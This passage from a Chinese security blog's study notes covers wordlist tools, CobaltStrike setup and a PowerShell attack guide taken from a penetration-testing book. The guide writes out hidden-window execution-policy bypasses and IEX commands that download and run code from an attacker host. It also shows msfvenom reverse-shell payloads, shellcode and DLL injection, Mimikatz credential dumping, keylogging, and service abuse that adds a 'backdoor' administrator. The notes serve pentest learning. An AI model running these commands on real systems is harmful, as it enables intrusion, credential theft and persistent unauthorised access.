-i</code></p><p>将以交互的形式启动CUPP，输入对应内容将输出wordlist到CUPP目录下</p><h2 id="1-3-创建自定义单词列表来破解密码"><a href="#1-3-创建自定义单词列表来破解密码" class="headerlink" title="1.3 创建自定义单词列表来破解密码"></a>1.3 创建自定义单词列表来破解密码</h2><h3 id="1-3-1-使用CeWL来映射网站"><a href="#1-3-1-使用CeWL来映射网站" class="headerlink" title="1.3.1 使用CeWL来映射网站"></a>1.3.1 使用CeWL来映射网站</h3><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添加额外的外部链接，接下来Cewl会给你返回一个txt字典文件，你可以把字典用到类似John the Ripper，hydra九头蛇这样的密码破解工具中</p><p>帮助命令<code>cewl --help\-h </code>    参考<a href="https://blog.csdn.net/weixin_46700042/article/details/109190080">博客</a></p><p>最简单的字典生成命令</p><p><code>cewl www.baidu.com -w baidu.txt</code></p><p>字典部分内容如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210827160837.png" alt="cewl字典部分内容"></p><h3 id="1-3-2-使用twofi从Twitter提取单词"><a href="#1-3-2-使用twofi从Twitter提取单词" class="headerlink" title="1.3.2 使用twofi从Twitter提取单词"></a>1.3.2 使用twofi从Twitter提取单词</h3><p>当我们可以用Facebook、Twitter、LinkedIn等社交平台来描述一个人时，可以使用twofi（Twitterwords of instest）</p><p>twofi是用Ruby脚本实现的，利用Twitter API来生成离线破解密码的单词列表。为了使用twofi，我们必须有一个有效的TwitterAPI密钥和API密码</p><p>在针对个体的攻击中，twofi将会更加强大</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_84"></p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali高级渗透测试</tag>
      
      <tag>书籍</tag>
      
      <tag>OSINT</tag>
      
      <tag>被动侦察</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike安装</title>
    <link href="/2021/08/15/%E4%BF%A1%E5%AE%89/Tools/CobaltStrike%E5%AE%89%E8%A3%85/"/>
    <url>/2021/08/15/%E4%BF%A1%E5%AE%89/Tools/CobaltStrike%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike安装"><a href="#CobaltStrike安装" class="headerlink" title="CobaltStrike安装"></a>CobaltStrike安装</h1><p>操作简单，这里进行简单的记录</p><ol><li><p>进入对应的目录输入以下命令即可启动服务端</p> <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">./teamserver &lt;你的ip&gt; &lt;密码&gt;<br></code></pre></div></td></tr></table></figure></li><li><p>启动命令<code>./start</code>之后用户名随意填写，其他的按照之前启动的填写即可</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>信安 Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试实战指南-PowerShell攻击指南</title>
    <link href="/2021/08/04/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-PowerShell%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97/"/>
    <url>/2021/08/04/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-PowerShell%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="PowerShell攻击指南"><a href="#PowerShell攻击指南" class="headerlink" title="PowerShell攻击指南"></a>PowerShell攻击指南</h1><h2 id="1-PowerShell-技术"><a href="#1-PowerShell-技术" class="headerlink" title="1. PowerShell 技术"></a>1. PowerShell 技术</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，它内置在每个受支持的Windows版本中 (Windows 7/Windows 2008 R2和更高版本)，使命令行用户和脚本编写者可以利用.NET Framework的强大功能。一旦攻击者可以在一台计算机上运行代码，他们就会下载PowerShell脚本文件(.ps1)到磁盘中执行，甚至无须写到磁盘中执行，它可以直接在内存中运行，也可以把PowerShell看作命令行提示符cmd.exe的扩充！</p><p>目前PowerShell具有以下优点</p><ol><li>Windows 7以上的操作系统默认安装</li><li>PowerShell脚本可以运行在内存中,不需要写入磁盘</li><li>可以从另一个系统中下载PowerShell脚本并执行</li><li>目前很多工具都是基于PowerShell开发的</li><li>很多安全软件并不能检测到PowerShell的活动</li><li>cmd.exe通常会被阻止运行,但是PowerShell不会</li><li>可以用来管理活动目录</li></ol><p>常用的PowerShell攻击工具有以下几种</p><ol><li> PowerSplit：这是众多PowerShell攻击工具中被广泛使用的PowerShell后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作</li><li>Nishang：基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包含下载和执行、键盘记录、DNS、延时命令等脚本</li><li>Empire：基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制</li><li>PowerCat：PowerShell版的NetCat，有着网络工具中的“瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向</li></ol><h3 id="1-1-PowerShell的基本概念"><a href="#1-1-PowerShell的基本概念" class="headerlink" title="1.1 PowerShell的基本概念"></a>1.1 PowerShell的基本概念</h3><ol><li><p>PS1文件</p><p>PowerShell脚本类似bat脚本，后缀为PS1</p></li><li><p>执行策略</p><p>为防止恶意脚本的执行，PowerShell有一个执行策略，默认情况下，执行策略被设为受限</p><p>在PowerShell脚本无法执行时，可以使用cmdlet命令确认当前的执行策略</p><ul><li>Get-ExecutionPolicy</li><li>Bypass：任意执行</li><li>Restricted：脚本不能运行(默认设置)</li><li>RemoteSigned：本地创建的脚本可以运行，但是从网上下载的脚本不能运行(拥有数字证书签名的除外)</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行</li><li>Unrestricted：允许全部脚本执行，对非本地脚本给出提示</li><li>Undefined：设置为默认</li></ul><p>可以使用以下的命令设置执行策略</p><p>Set-ExecutionPolicy &lt;Policy name&gt;</p></li><li><p>运行脚本</p><p>运行脚本需要输入完整路径，或在当前目录下输入./文件名</p></li><li><p>管道</p><p>管道的作用是将一个命令的输作为另一个命令的输入，两个命令之间用管道符号<code>|</code>连接</p><p>举例：<code>get-process p*|stop-process</code> 停止当前运行中以p开头命名的程序</p></li></ol><h3 id="1-2-PowerShell-常用命令"><a href="#1-2-PowerShell-常用命令" class="headerlink" title="1.2 PowerShell 常用命令"></a>1.2 PowerShell 常用命令</h3><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 新建目录</span><br><span class="hljs-built_in">new-item</span> test <span class="hljs-literal">-type</span> directory <span class="hljs-comment"># 可简写为dir</span><br><span class="hljs-comment"># 新建文件</span><br><span class="hljs-built_in">new-item</span> text.txt <span class="hljs-literal">-type</span> file<br><span class="hljs-comment"># 删除目录或文件</span><br><span class="hljs-built_in">remove-item</span> text.txt<br><span class="hljs-comment"># 显示文本内容</span><br><span class="hljs-built_in">get-content</span> text.txt<br><span class="hljs-comment"># 设置文本内容</span><br><span class="hljs-built_in">set-content</span> text.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;Hello&quot;</span><br><span class="hljs-comment"># 追加内容</span><br><span class="hljs-built_in">add-content</span> one.txt <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;add&quot;</span><br><span class="hljs-comment"># 清除内容</span><br><span class="hljs-built_in">clear-content</span> one.txt<br></code></pre></div></td></tr></table></figure><p>如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所有以下方法绕过策略来执行脚本</p><ol><li><p>绕过本地权限执行</p><p>上传脚本到服务器，在CMD环境下，在目标服务器本地执行该脚本</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">PowerShell.exe-ExecutionPolicy Bypass-File ***.ps1<br></code></pre></div></td></tr></table></figure></li><li><p>本地隐藏绕过权限执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -noprofile-nonl iex(new-objectNet.webclient) .downloadstring (<span class="hljs-string">&quot;**.ps1&quot;</span>) ; [parameters]<br></code></pre></div></td></tr></table></figure><p>对上述命令的参数进行说明</p><ul><li>excutionpolicy bypass：绕过执行安全策略</li><li>windowstyle hidden：隐藏窗口</li><li>nologo：启动不显示版权标示的PowerShell</li><li>noninteractive(- nonl):非交互模式，PowerShell不为用户提供交互的提示</li><li>noprofile(-nop):PowerShell控制台不加载当前用户的配置文件</li><li>Noexit:执行后不退出Shell</li></ul></li></ol><h2 id="2-PowerSploit"><a href="#2-PowerSploit" class="headerlink" title="2. PowerSploit"></a>2. PowerSploit</h2><p>PowerSploit是一款基于PowerShell的后渗透(Post-Exploitation)框架软件，包含很多PowerShell攻击脚本，它们主要用于渗透中的信息侦察、权限提升、权限维持，其GitHub地址为https: //github.com/PowerShellMafia/PowerSploit</p><h3 id="2-1-PowerSploit安装"><a href="#2-1-PowerSploit安装" class="headerlink" title="2.1 PowerSploit安装"></a>2.1 PowerSploit安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先克隆具体文件</span><br>git <span class="hljs-built_in">clone</span> https://github.com/PowerShellMafia/PowerSploit<br><span class="hljs-comment"># 开启www服务</span><br>service apache start<br></code></pre></div></td></tr></table></figure><p>将文件复制到网站目录</p><p>各模块功能</p><ul><li>AntivirusBypass: 发现杀毒软件的查杀特征</li><li>CodeExecution: 在目标主机上执行代码</li><li>Exfiltration: 目标主机上的信息搜集工具</li><li>Mayhem: 蓝屏等破坏性脚本</li><li>Persistence: 后门脚本(持久性控制)</li><li>Recon: 以目标主机位跳板进行内网信息侦查</li><li>ScriptModification: 在目标主机上创建或修改脚本</li></ul><p>对使用较多的脚本进行介绍</p><h4 id="2-1-1-Invoke-Shellcode"><a href="#2-1-1-Invoke-Shellcode" class="headerlink" title="2.1.1 Invoke-Shellcode"></a>2.1.1 Invoke-Shellcode</h4><p>CodeExecution模块下的Invoke-Shellcode脚本常用于将ShellCode插入指定的进程ID或本地PowewrShell中。以下介绍常用的反弹Meterpreter Shell方法</p><ol><li><p>直接执行ShellCode反弹Meterpreter Shell</p><p>在MSF中使用reverse_https模块进行反弹，设置内容如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210808225810.png"></p><p>使用<code>msfvenom</code>命令生成一个PowerShell脚本密码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p wimdows/meterpreter/reverse_https lhost=192.168.66.132 lport=4444 -f powershell -o /var/<span class="hljs-built_in">local</span>/<br></code></pre></div></td></tr></table></figure><p>之后在目标机执行如下命令</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 获取脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br><span class="hljs-comment"># 获取病毒文件</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/test&quot;</span>)<br><span class="hljs-comment"># 执行病毒文件 -force表示不用提示直接执行</span><br><span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-shellcode</span> <span class="hljs-variable">$buf</span> <span class="hljs-literal">-force</span> <span class="hljs-comment"># 执行时出现问题，暂时只是进行记录</span><br><span class="hljs-comment"># 使用如下命令获取帮助</span><br><span class="hljs-built_in">get-help</span> <span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-full</span><br></code></pre></div></td></tr></table></figure><p>指定进程注入</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 首先依旧是获取内容</span><br><span class="hljs-comment"># 获取脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)<br><span class="hljs-comment"># 获取病毒文件</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">new-object</span> Net.webclient).downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/test&quot;</span>)<br><span class="hljs-comment"># 获取当前进程</span><br><span class="hljs-built_in">ps</span> <span class="hljs-comment"># 或 get-process</span><br><span class="hljs-comment"># 注入进程</span><br><span class="hljs-built_in">invoke-shellcode</span> <span class="hljs-literal">-processID</span> (ID) <span class="hljs-literal">-shellcode</span> <span class="hljs-variable">$buf</span> <span class="hljs-literal">-force</span><br></code></pre></div></td></tr></table></figure></li></ol><h4 id="2-1-2-Invoke-DllInjection"><a href="#2-1-2-Invoke-DllInjection" class="headerlink" title="2.1.2 Invoke-DllInjection"></a>2.1.2 Invoke-DllInjection</h4><p>同样是Code Execution模块下的另一个脚本Invoke-DLLInjection，它是一个DLL注入的脚本</p><p>同理还是先下载脚本,输入以下命令</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;http://192.168.31.247/PowerSploit/CodeExecution/Invoke-Dlllnjection.ps1&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>然后使用以下命令在Kali中生成一个DLL注入脚本</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.66.132 lport=4444 -f dll -o test.dll <br></code></pre></div></td></tr></table></figure><p>之后使用如下命令进行注入</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">invoke-dllinjection</span> <span class="hljs-literal">-processid</span> <span class="hljs-number">200</span> <span class="hljs-literal">-dll</span> c:\test.dll <span class="hljs-comment"># 同样不能执行</span><br></code></pre></div></td></tr></table></figure><h4 id="2-1-3-Invoke-Portscan"><a href="#2-1-3-Invoke-Portscan" class="headerlink" title="2.1.3 Invoke-Portscan"></a>2.1.3 Invoke-Portscan</h4><p>Invoke-Portscan是Recon模块下的脚本，用于端口扫描</p><p>首先下载脚本</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Recon/Invoke-Portscan.ps1&quot;</span>)<br><span class="hljs-comment"># 脚本执行命令</span><br><span class="hljs-built_in">Invoke-portscan</span> <span class="hljs-literal">-hosts</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">1.2</span> <span class="hljs-literal">-ports</span> <span class="hljs-string">&quot;80,22,3389&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="2-1-4-Invoke-Mimikatz"><a href="#2-1-4-Invoke-Mimikatz" class="headerlink" title="2.1.4 Invoke-Mimikatz"></a>2.1.4 Invoke-Mimikatz</h4><p>Invoke-Mimikatz是Exfiltration模块下的一个脚本，用于捕捉密码</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 下载脚本</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;</span>)<br><span class="hljs-comment"># 使用脚本</span><br><span class="hljs-built_in">Invoke-mimikatz</span> <span class="hljs-literal">-dumpcreds</span> <span class="hljs-comment"># 还是一大堆报错！！！！</span><br></code></pre></div></td></tr></table></figure><h4 id="2-1-5-Get-keystrokes"><a href="#2-1-5-Get-keystrokes" class="headerlink" title="2.1.5 Get-keystrokes"></a>2.1.5 Get-keystrokes</h4><p>Get-Keystrokes是Exfiltration模块下的一个脚本，用于键盘记录，功能相当强大，不仅有键盘输入记录，甚至能记录鼠标的点击情况,还能记录详细的时间,实战时可以直接放入后台运行。同样先使用以下命令下载脚本</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="hljs-string">&quot;http://192.168.66.129/PowerSploit/Exfiltration/Get-keystrokes.ps1&quot;</span>)<br><span class="hljs-comment"># 导出数据命令</span><br><span class="hljs-built_in">Get-keystrokes</span> <span class="hljs-literal">-logpath</span> C:\text.txt <span class="hljs-comment"># 始终无记录，可能是由于虚拟机的缘故</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-PowerUp-攻击模块讲解"><a href="#2-2-PowerUp-攻击模块讲解" class="headerlink" title="2.2 PowerUp 攻击模块讲解"></a>2.2 PowerUp 攻击模块讲解</h3><p>powerup是privesc模块下的一个脚本，只要是用于寻找目标主机windows服务劳动进行提权的脚本</p><p>可在有模块的机器使用<code>import-module</code>命令加载powerup脚本模块</p><p>常用模块介绍</p><ol><li><p>Invoke-AllChecks</p><p>模块作用是自动执行PowerUp下所有的脚本来检查目标主机,直接使用命令即可<code>invoke-allchecks</code></p></li><li><p>Find-PathDLLHijack</p><p>模块用于检查当前%path%的那些目录是用户可以写入的，直接使用命令<code>find-pathdllhijack</code></p></li><li><p>Get-ApplicationHost</p><p>模块可利用系统的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码，执行命令<code>get-applicationhost</code>列表展示命令<code>get-applicationhost |format-table-autosize</code></p></li><li><p>Get-RegistryAlwaysInstallElevated</p><p>模块用于检查AlwaysInstallElevatec注册表项是否被设置，绕过被设置，则以为MSI文件是以SYSTEM权限运行。执行命令<code>get-registryalwaysinstallelevated</code></p></li><li><p>Get-RegistryAutoLogon</p><p>模块用于检测Winlogin注册表的AutoAdminLogon项有没有被设置，可查询默认的用户名和密码，执行命令<code>get-registrysutologon</code></p></li><li><p>Get-ServiceDetail</p><p>模块用于返回某服务的信息，输入命令如下</p><p><code>get-servicedetail -servicename dhcp</code></p></li><li><p>Get-ServiceFilePermission</p><p>模块用于检查当前用户能够在哪些服务的命令写入相关联的可执行文件，我们可以通过这些文件首先提权，命令执行<code>get-servicefilepermission</code></p></li><li><p>Test-ServiceDaclPermission</p><p>模块用于检查所有可用的服务，并产生对这些打开的服务进行修改，如果可修改就返回该服务对象，执行命令<code>test-sercicedaclpermission</code></p></li><li><p>Get-ServiceUnquoted</p><p>模块用于检查服务路径，返回包含空格但是不带引号的服务路径。此处利用了windows的一个逻辑漏洞，即当文件包含空格时，Windows API会被解释为两个路径，并将这两个文件同时执行，有时可能会造成权限的提升</p><p>例子：C:\program files\hello.exe会被解释为C:\program.exe和C:\program files\hello.exe</p><p>执行命令:<code>get-serviceunquoted</code></p></li><li><p>Get-UnattendedInstallFile</p><p>模块用于检查一下路径，查找是否存在这些文件，文件中可能包含部署凭据，文件包括：</p><ul><li>C:\sysprep\sysprep.xml</li><li>C:\sysprep\sysprep.inf</li><li>C:\sysprep.inf</li><li>C:\Windows\Panther\Unattended.xml</li><li>C:\Windows\Panther\Unattend\Unattended.xml</li><li>C:\Windows\Panther\Unattend.xml</li><li>C:\Windows\Panther\Unattend\Unattend.xml</li><li>C:\Windows\System32\Sysprep\unattend.xml</li><li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li></ul><p>执行命令<code>get-unattendedinstallfile</code></p></li><li><p>Get-ModifiableRegistryAutoRun</p><p>模块用于检查开机自启的应用程序路径和注册表键值，然后返回当前用户可修改的程序路径。被检查的注册表键值有：</p><ul><li>HKLM\SOFTWAREMicrosoft\Windows\CurrentVersion\Run</li><li>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</li><li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</li><li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Once</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService</li><li>HKLMSOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run Service</li><li>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run OnceService</li></ul><p>执行命令<code>get-modifiableregistryautorun</code></p></li><li><p>Get-ModifiableScheduledTaskFile</p><p>模块用于返回当前用户能够修改的计划任务程序的名称和路径，执行命令<code>get-modifiablescheduledtaskfile</code></p></li><li><p>Get-Webconfig</p><p>模块用于返回当前服务器上的web.config文件中的数据库连接字符串的明文。执行命令<code>get-webconfig</code></p></li><li><p>Invoke-ServiceAbuse</p><p>模块通过修改服务来添加用户到指定组，并可以通过设置-cmd产生触发添加用户的自定义命令，具体命令</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看当前正在运行的服务</span><br><span class="hljs-built_in">get-service</span> | <span class="hljs-built_in">where-object</span> &#123;<span class="hljs-variable">$_</span>.status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;running&quot;</span>&#125;<br><span class="hljs-comment"># 添加默认账号</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务<br><span class="hljs-comment"># 指定添加的域账号</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TEST\john&quot;</span><br><span class="hljs-comment"># 指定添加用户，用户密码及添加的用户组</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> backdoor <span class="hljs-literal">-password</span> password <span class="hljs-literal">-localgroup</span> <span class="hljs-string">&quot;administrators&quot;</span><br><span class="hljs-comment"># 自定义执行命令</span><br><span class="hljs-built_in">invoke-serviceabuse</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net...&quot;</span><br></code></pre></div></td></tr></table></figure><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210810161355.png"></p></li><li><p>Restore-ServiceBinaty</p><p>模块用于恢复服务的可执行文件到原始目录，执行命令如下<code>restore-servicebinary -servicename 服务</code></p></li><li><p>Test-ServiceDaclPermission</p><p>模块检查某个用户是否在服务中有自由访问控制的权限，结果返回true或false。执行命令<code>test-servicedaclpermission -servicename 服务</code></p></li><li><p>Write-HijackDll</p><p>模块用于输出一个自定义命令并且能够自我删除的bat文件到$env: Temp\debug.bat，并输出一个能够启动这个bat文件的DLL</p></li><li><p>Write-UserAddMSI</p><p>模块用于生成一个安装文件，运行这个安装文件后会弹出添加用户的对话框，执行命令<code>write-useraddmsi</code></p></li><li><p>Write-ServiceBinary</p><p>模块用于预编译C#服务的可执行文件，默认创建一个管理员账户，可通过command定制自己的命令</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 添加默认账户</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务<br><span class="hljs-comment"># 指定添加域账户</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TMP\john&quot;</span><br><span class="hljs-comment"># 指定添加用户，用户密码以及添加的用户组</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> one <span class="hljs-literal">-password</span> password<br><span class="hljs-comment"># 自定义执行命令</span><br><span class="hljs-built_in">write-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net&quot;</span><br></code></pre></div></td></tr></table></figure></li><li><p>Install-ServiceBinary</p><p>模块通过write-servicebinary写一个C#服务来添加用户，执行命令如下</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> dhcp<br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> <span class="hljs-string">&quot;TMP\john&quot;</span><br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-username</span> tmp <span class="hljs-literal">-password</span> password<br><span class="hljs-built_in">install-servicebinary</span> <span class="hljs-literal">-servicename</span> 服务 <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;net....&quot;</span><br></code></pre></div></td></tr></table></figure><p>与write-ServiceBinary不同的是，write生成可执行文件，install直接按照服务</p></li></ol><h3 id="2-3-PowerUp攻击模块实战演练"><a href="#2-3-PowerUp攻击模块实战演练" class="headerlink" title="2.3 PowerUp攻击模块实战演练"></a>2.3 PowerUp攻击模块实战演练</h3><p>常用模块介绍</p><h4 id="2-3-1-实战一"><a href="#2-3-1-实战一" class="headerlink" title="2.3.1 实战一"></a>2.3.1 实战一</h4><p>未完待续</p><h2 id="3-Empire"><a href="#3-Empire" class="headerlink" title="3. Empire"></a>3. 